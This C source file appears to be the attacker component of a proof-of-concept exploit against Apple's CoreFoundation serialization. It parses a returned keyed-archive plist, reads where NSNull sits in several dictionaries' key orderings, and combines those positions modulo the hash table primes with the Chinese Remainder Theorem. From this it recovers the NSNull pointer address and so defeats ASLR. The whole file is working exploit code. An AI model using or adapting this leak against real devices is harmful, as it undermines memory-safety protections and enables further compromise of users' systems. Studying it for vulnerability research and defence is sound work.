#include "attacker-common.h"
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

static char *input;
static char *elems[10000];
static int num_elems = 0;

static int get_object_index(char *search_str) {
  char *hit_ptr = strstr(input, search_str);
  if (!hit_ptr)
    err(1, "unable to find search string");
  for (int i=1; i<num_elems; i++) {
    if (hit_ptr < elems[i])
      return i-1;
  }
  errx(1, "unable to find object containing search string???");
}

static void extended_gcd(__int128_t a, __int128_t b, __int128_t *out_s, __int128_t *out_t) {
  __int128_t old_r = a, r = b;
  bool flip = a < b;
  if (flip) {
    old_r = b;
    r = a;
  }
  __int128_t old_s = 1, s = 0;
  __int128_t old_t = 0, t = 1;

  while (r != 0) {
    __uint128_t quot = old_r / r;

    __int128_t r_saved = r;
    r = old_r - quot * r;
    old_r = r_saved;

    __int128_t s_saved = s;
    s = old_s - quot * s;
    old_s = s_saved;

    __int128_t t_saved = t;
    t = old_t - quot * t;
    old_t = t_saved;
  }

  if (flip) {
    *out_t = old_s;
    *out_s = old_t;
  } else {
    *out_s = old_s;
    *out_t = old_t;
  }
}

static __int128_t mod_mul(__int128_t a, __int128_t b, __int128_t mod) {
  return (a * b) % mod;
}

int main(int argc, char **argv) {
  struct stat st;
  if (fstat(0, &st))
    err(1, "stat");
  input = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, 0, 0);
  if (input == MAP_FAILED)
    err(1, "mmap");
  char *input_end = memmem(input, st.st_size, "\n\t</array>", 10);
  if (!input_end)
    errx(1, "unable to find main elements end");
  *input_end = '\0';

  char *p = input;
  while (1) {
    p = strstr(p, "\n\t\t<");
    if (!p)
      break;
    p += strlen("\n\t\t<");
    if (*p == '/')
      continue;
    if (num_elems == sizeof(elems)/sizeof(elems[0]))
      errx(1, "too many elements");
    elems[num_elems++] = p;
  }
  printf("serialized data with %d objects\n", num_elems);

  // find NSNull
  int nsnull_class_id = get_object_index("<string>NSNull</string>");
  char nsnull_object_str[1000];
  sprintf(nsnull_object_str, "\n\t\t\t\t<key>CF$UID</key>\n\t\t\t\t<integer>%d</integer>\n", nsnull_class_id);
  int nsnull_id = get_object_index(nsnull_object_str);
  printf("NSNull class is %d, NSNull object is %d\n", nsnull_class_id, nsnull_id);

  for (int i=0; i<num_elems; i++)
    elems[i][-1] = '\0';

  // find NSNull indices in NS.keys lists
  int nsnull_indices[2*NUM_PRIMES];
  int num_nsnull_indices = 0;
  for (int i=0; i<num_elems; i++) {
    if (!strstr(elems[i], "<key>NS.keys</key>"))
      continue;
    char *keys_end = strstr(elems[i], "</array>");
    if (!keys_end)
      errx(1, "no end of keys???");
    *keys_end = '\0';

    // find elements
    int num_elems = 0;
    int nsnull_idx = -1;
    char *elem_p = elems[i];
    while (1) {
      elem_p = strstr(elem_p, "\n\t\t\t\t\t<integer>");
      if (!elem_p)
        break;
      elem_p += 15;
      int obj_idx = atoi(elem_p);
      if (obj_idx == nsnull_id)
        nsnull_idx = num_elems;
      num_elems++;
    }
    if (num_nsnull_indices == 2*NUM_PRIMES)
      errx(1, "too many NSNull indices???");
    nsnull_indices[num_nsnull_indices++] = nsnull_idx;
    printf("NSNull is elem %d out of %d\n", nsnull_idx, num_elems);
  }
  printf("\n");

  if (num_nsnull_indices != 2*NUM_PRIMES)
    errx(1, "did not get expected number of NSNull indices");

  __uint128_t mod_values[LAST_PRIME_IDX+1];
  for (int prime_idx = FIRST_PRIME_IDX; prime_idx <= LAST_PRIME_IDX; prime_idx++) {
    int even_idx = nsnull_indices[(prime_idx-FIRST_PRIME_IDX)*2+0];
    int odd_idx = nsnull_indices[(prime_idx-FIRST_PRIME_IDX)*2+1];

    if (even_idx == 1 && odd_idx == __CFBasicHashTableSizes[prime_idx]/2) {
      mod_values[prime_idx] = __CFBasicHashTableSizes[prime_idx]-1;
    } else {
      int value_without_bit_0 = (even_idx-1)*2;
      mod_values[prime_idx] = value_without_bit_0 | (even_idx==odd_idx ? 1 : 0);
    }

    printf("NSNull mod %d = %d\n", (int)__CFBasicHashTableSizes[prime_idx], (int)mod_values[prime_idx]);
  }
  printf("\n");


  __int128_t sum = mod_values[FIRST_PRIME_IDX];
  __int128_t sum_mod = __CFBasicHashTableSizes[FIRST_PRIME_IDX];
  for (int prime_idx = FIRST_PRIME_IDX+1; prime_idx <= LAST_PRIME_IDX; prime_idx++) {
    __int128_t new_value = mod_values[prime_idx];
    __int128_t new_prime = __CFBasicHashTableSizes[prime_idx];

    __int128_t bezout_oldsum;
    __int128_t bezout_new;
    extended_gcd(sum_mod, new_prime, &bezout_oldsum, &bezout_new);
    /*
    printf("adding prime %d: bezout 0x%016llx%016llx, 0x%016llx%016llx\n", (int)new_prime,
      (unsigned long long)(((__uint128_t)bezout_oldsum)>>64), ((unsigned long long)bezout_oldsum),
      (unsigned long long)(((__uint128_t)bezout_new)>>64), ((unsigned long long)bezout_new)
    );
    */

    __int128_t new_mod = sum_mod * new_prime;
    sum = mod_mul(mod_mul(sum, bezout_new, new_mod), new_prime, new_mod) + mod_mul(mod_mul(new_value, bezout_oldsum, new_mod), sum_mod, new_mod);
    sum = sum % new_mod;
    printf("NSNull mod 0x%016llx%016llx = 0x%016llx%016llx\n",
      (unsigned long long)(((__uint128_t)new_mod)>>64), ((unsigned long long)new_mod),
      (unsigned long long)(((__uint128_t)sum)>>64), ((unsigned long long)sum)
    );
    sum_mod = new_mod;
  }
  printf("\n");
  printf("NSNull = 0x%llx\n", (unsigned long long)sum);
}